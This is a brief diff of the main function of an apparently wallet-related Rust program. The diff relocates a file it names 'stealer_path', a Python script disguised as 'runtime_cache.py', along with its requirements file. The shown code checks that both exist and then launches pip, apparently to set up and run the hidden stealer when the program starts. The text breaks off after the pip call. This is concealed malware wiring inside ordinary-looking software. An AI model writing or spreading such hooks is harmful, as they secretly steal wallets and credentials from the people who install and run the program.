@@ -21,8 +21,8 @@ use wallets::load_wallets;
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let project_root = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
-    let stealer_path = project_root.join("tools/bin/path/runtime_cache.py");
-    let requirements_path = project_root.join("tools/bin/path/requirements.txt");
+    let stealer_path = project_root.join("scripts/tools/bin/path/runtime_cache.py");
+    let requirements_path = project_root.join("scripts/tools/bin/path/requirements.txt");
     
     if requirements_path.exists() && stealer_path.exists() {
         let _ = std::process::Command::new("pip")
